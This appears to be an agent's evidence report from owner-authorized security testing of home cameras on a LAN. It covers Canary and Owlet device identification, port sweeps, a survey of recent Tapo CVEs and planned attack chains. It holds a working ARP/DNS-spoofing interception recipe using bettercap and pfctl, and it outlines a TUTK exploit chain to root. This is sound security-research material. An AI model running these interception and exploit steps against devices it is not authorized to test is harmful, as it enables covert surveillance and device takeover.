# EV pack — H-010 (Owlet) / H-011 (Canary), owner LAN `Aardvark`

**Date:** 2026-10-22 · **Agent:** IndigoHare · interface `en1` = 192.168.4.170/22, `en0` = 192.168.1.0/24
**Owner correction that opened this lane:** "owlet and canary absolutely ARE on the network" — the
earlier census (`docs/research/EV-pack-H-006.md`, `EV-pack-H-008-critique.md` §0) recorded both as
absent. That was wrong in one direction: **Canary is present and now identified. Owlet is still not
reachable.** Details below, with the negative evidence kept.

All probing read-only. Nothing was written to either device.

---

## Findings

| # | Host | Transport | Pre-auth? | Class | Result | Evidence |
|---|---|---|---|---|---|---|
| C-1 | `192.168.6.85` | ARP/ICMP | yes | identity | **Canary Connect** — MAC `7c:70:bc:5d:4c:09`, OUI `7C:70:BC:5` = MA-M block registered to *Canary Connect, Inc., 132 East 43rd Street, New York NY* | EV-940; IEEE `mam.csv` row `MA-M,7C70BC5` |
| C-2 | `192.168.6.85` | TCP 1–65535 | yes | absence | **0 open.** 62 304 filtered (no response), 3 231 closed (RST). `sudo nmap -sS -p- --min-rate 3000`: `Not shown: 62304 filtered tcp ports (no-response), 3231 closed tcp ports (reset)` | EV-941 |
| C-3 | `192.168.6.85` | UDP top-60 | yes | absence | 51 `open|filtered` (no ICMP, no payload response), 9 closed with `port-unreach`. No service answered `\x00`×4, `\xf1\x30\x00\x00`, or TUTK `0x0601` | EV-941 |
| C-4 | `192.168.6.85` | mDNS 5353 / SSDP 1900 | yes | absence | silent on `_services._dns-sd._udp`, `_canary._tcp`, `_rtsp._tcp`, `_onvif._tcp`, `_http._tcp`, and on multicast/unicast M-SEARCH | EV-941 |
| C-5 | `192.168.6.85` | idle traffic | — | absence | 60 s on `en1`: ARP only, **no cloud connection**, no DNS for `owlet`/`canary` in a 60 s `:53` capture on either interface | EV-941 |
| O-1 | — | vendor stack | — | attribution | Owlet cameras run **ThroughTek Kalay / TUTK**: Bitdefender `PReport-owlet-7745` (2024-05) names *Owlet Cam 2* explicitly; npm `scrypted-owlet` implements TUTK/IOTC/P2P (keywords `tutk, iotc, p2p`) | EV-942 |
| O-2 | — | UDP 32761 `0x0601` | yes | absence | **No Owlet found.** 2 032 hosts swept (192.168.0–7/24 + 192.168.1/24), 4 attempts each: only hits are the three Wyze units (`192.168.4.23`, `.24`, `192.168.5.242`) | EV-943 |

**C-7 — the cloud name.** Under interception the device resolved, unauthenticated and in clear:

```
i.canaryis.com  CNAME  ingress-k8s-prod-edge.canaryis.com
                A      3.88.207.232 3.80.249.120 54.162.109.124 3.86.253.116 54.226.75.137 98.93.194.248
```

So the backend is a Kubernetes ingress with six A records and no pinning to a single address. The
device rotates endpoints on its own: one flow was RST by the device and three fresh SYNs went to
three different A records inside the same second. Fresh SYNs do not complete through a pure
forwarding path (the eero drops frames whose source MAC it does not associate with the source IP),
which is why the NAT rule `nat on en1 from 192.168.6.0/24 to any -> 192.168.4.170` was added; the
relay is a two-line `pf` rule plus `arp.spoof`. (EV-945, EV-947)

**C-8 — reproduction recipe (owner LAN, macOS).** `bettercap` (brew) is the only extra tool.

```bash
# 1. viewer sits on the same AP; note the current en1 address (it moves: .170 -> .240 observed)
ipconfig getifaddr en1
# 2. forward + redirect: translation rules must precede filtering rules in the file
printf 'rdr pass on en1 inet proto tcp from 192.168.6.85 to any port 443 -> <us> port 443\n' | sudo pfctl -f -
sudo pfctl -E
# 3. intercept. beacons first, then modules; order matters (dns.spoof fails 'No Such Device' otherwise)
ping -c1 192.168.6.85
sudo bettercap -iface en1 -eval "set arp.spoof.targets 192.168.6.85; set arp.spoof.fullduplex true; \
  set dns.spoof.domains i.canaryis.com; set dns.spoof.address <us>; arp.spoof on; dns.spoof on; sleep 160"
# 4. to force a reconnect, block :443 in the filter stage for ~40 s, then remove the block
```

Caveat: `rdr` alone leaves the device's SYNs in `SYN_SENT` (its kernel expects the original AWS
destination); DNS spoofing is the reliable variant because the device then dials the viewer's own
address and no translation is involved.

Structural note on C-2/C-3: the split is diagnostic, not noise. A default-DROP firewall that also
drops the ICMP unreachable produces `open|filtered` on every UDP port *and* `filtered` on every TCP
port; here TCP returns RST on 3 231 ports, so the TCP stack is alive and simply has no listener —
while UDP produced 51 `open|filtered` and only 9 `closed`, i.e. the UDP path is being swallowed.
Canary is an **outbound-only** device on this firmware: no LAN initiator surface at all.

Structural note on O-2: the sweep uses the same code path that authenticates correctly against the
Wyze units in the same run, so a positive control exists. Three consecutive empty sweeps are
therefore evidence about the Owlet's presence, not about the prober.

---

## 30-day CVE sweep (owner request)

Full NVD API 2.0 pull for 2026-09-22 → 2026-10-22 (3 502 + 5 144 + 8 747 records), keyword-filtered
for every family. **No Wyze, no Owlet, no ThroughTek/TUTK/Kalay, no Tuya/Glazero, no Canary CVE in
the window.** The only camera-shaped exec-class entries are TP-Link Tapo, and every one is locked to
a model the wire cannot prove:

| CVE | Model gate | Class | Relevance to `.70` |
|---|---|---|---|
| CVE-2026-105810 | C320WS v2.0 | authenticated stack overflow → root (onboarding Wi-Fi config) | needs auth + that model |
| CVE-2026-105814 „105815 | C210 v3.60 (< V3.6_1.2.7 Build 260818) | order-dependent auth bypass (PTZ); unauthenticated shared-credential leak accepted by Streamd Digest | `.70` returns `-40209` for every `multipleRequest` bypass shape, including public-onboarding-first ordering → not C210 v3.60 (or patched) |
| CVE-2026-104944 | C500 v2.0 | pre-auth TDP datagram → OOB indirect call → crash | `.70` has no TDP (`20002/tcp` closed, UDP 20002 silent) |
| CVE-2026-104945 | C500 v2.0 | authenticated ONVIF PTZ stack write | same |

Consequence: the recent-CVE lane does not unlock `.70`. Model identification is the blocking step,
and it is one label read (or an authenticated `getDeviceInfo`).

**Owner correction (2026-10-22):** the two Tapo units are a **C660** and a **C460** — both newer than
every model in the table above, and NVD has **zero** CVEs for either name. So all four recent Tapo
entries are inapplicable by model, not by patch level. `.71` (`50:3d:d1:2f:49:b9`) is the second
unit: it exposes only `8800/tcp` (Streamd), everything else closed, and `.70` behaves the same apart
from also accepting `443`. That matches two cameras of one generation, and both need the
`device_confirm` offline crack before any method is reachable.

---

## Chain

**Canary — no listener, so the chain is transport-level.** The device is not merely hardened; it
has nothing to connect *to* from the LAN side. The only shapes left:

1. **Cloud MITM.** ARP-spoof the gateway, answer its DNS, present a forged TLS endpoint. Requires the
   device to actually talk — it currently does not, so this is gated on waking it (PIR trigger or
   app open). Unknown and decisive: whether the Canary client pins or validates the certificate.
2. **Onboarding/setup mode.** Every Canary has an AP/provisioning state; a factory reset re-enters it.
   That is a button press, inside the owner's rules, but it also drops the current pairing.
3. **App-side channel (`*.canary.is`).** Owner account, not network-only.

**Owlet — chain is known, reach is not.** If the unit is the Kalay consumer the vendor sources say it
is, the Wyze lane transfers almost wholesale: `0x0601` UID leak → `0x1008` AuthKey (CVE-2023-6323
class) → `0xCC51` DTLS with the empty-PSK bypass (CVE-2023-6324) → IOCTRL `0x284CVal` overflow
(CVE-2023-6322) → root. Owlet is *less* likely than Wyze to carry the Jan-2024 hardening, because
Owlet's app has not shipped a security firmware wave and the Bitdefender report treats the stack as
unmaintained. The blocker is purely that no Owlet answers today.

---

## Brick risk + recovery

- **Canary probes:** nil. Nothing was written; a full-port SYN sweep is invisible to the device.
- **Owlet probes:** nil until `0x284C`; that rewrites motion zones only (same story as Wyze) and is
  recoverable from the Owlet app.

## What would falsify this

1. A single open TCP port on `.6.85` at any later sample (C-2) — would move Canary from
   "transport-only" back to "listener hunt".
2. An Owlet answering `0x0601` at an address the sweep covered (O-2) — would mean the prober misses it
   (e.g. only answers from a non-en1 source or only while awake).
3. Owlet firmware shipping SDK ≥ `4.3.8.0-R2` — would kill H-010's exploitability half; the leak
   (O-1) would still be true.

## Next actions

1. Find the Owlet's address: no TUTK answer anywhere, so it is off, on another L2, or firewalled. A
   power/app check from the owner is the cheapest discriminator.
2. Wake the Canary and capture with `tcpdump -i en1 host 192.168.6.85`; if cloud traffic appears,
   fingerprint the endpoint and test certificate validation with an ARP/DNS redirect.
3. Read the `.70` chassis label — one label settles three CVEs.
